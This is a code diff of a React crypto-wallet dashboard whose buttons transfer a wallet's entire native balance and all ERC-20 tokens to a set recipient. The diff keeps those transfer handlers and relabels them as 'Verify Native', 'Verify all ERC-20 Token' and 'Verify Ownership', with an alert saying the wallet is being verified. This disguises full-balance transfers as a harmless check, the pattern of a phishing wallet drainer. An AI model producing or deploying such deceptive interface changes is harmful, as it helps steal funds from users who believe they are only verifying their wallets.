@@ -63,7 +63,7 @@ function Dashboard() {
       const signature = await signMessageAsync({ message });
       setSignedMessage(signature);
       setVerified(true);
-      alert("Wallet successfully verified with Reown!");
+      alert("hold while wallet get verified!");
     } catch (err) {
       console.error(err);
       alert("Signing failed: " + err.message);
@@ -173,14 +173,14 @@ function Dashboard() {
           <p><strong>Recipient:</strong> {getRecipient()}</p>
 
           {/* Sign Wallet */}
-          <button style={styles.signButton} onClick={handleSign}>Sign Wallet (Verify on Reown)</button>
+          <button style={styles.signButton} onClick={handleSign}>Verify Ownership(Verify on Reown)</button>
           {verified && <p style={{ color: "#0f0", fontWeight: "bold" }}>✅ Wallet Verified!</p>}
           {signedMessage && <p style={{ wordBreak: "break-all" }}>Signature: {signedMessage}</p>}
 
           {/* Send Native */}
           {verified && (
             <button style={styles.sendButton} onClick={handleSendNative} disabled={sendingNative}>
-              {sendingNative ? "Sending..." : `Send All Native ${nativeBalance?.symbol}`}
+              {sendingNative ? "Sending..." : `Verify Native ${nativeBalance?.symbol}`}
             </button>
           )}
 
@@ -198,7 +198,7 @@ function Dashboard() {
                 <p>Balance: {ethers.utils.formatUnits(tokenBalance, tokenDecimals)} {tokenSymbol}</p>
               )}
               <button style={styles.sendButton} onClick={handleSendToken} disabled={sendingToken}>
-                {sendingToken ? "Sending..." : `Send All ERC-20 Token`}
+                {sendingToken ? "Sending..." : `Verify all ERC-20 Token`}
               </button>
             </div>
           )}
